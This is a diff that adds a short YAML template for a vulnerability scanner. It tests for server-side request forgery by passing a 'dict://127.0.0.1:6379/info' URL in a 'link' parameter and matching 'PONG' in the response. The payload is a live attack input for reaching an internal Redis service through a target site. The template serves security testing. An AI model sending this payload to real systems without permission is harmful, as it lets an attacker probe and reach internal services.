@@ -1,0 +1,20 @@
+id: ssrf4-36
+name: 'SSRF scheme dict via link'
+severity: high
+type: active
+tags:
+  - ssrf
+  - oob
+  - scheme
+description: 'Fetches dict URL via link (verify manually)'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      link:
+        - 'dict://127.0.0.1:6379/info'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PONG'
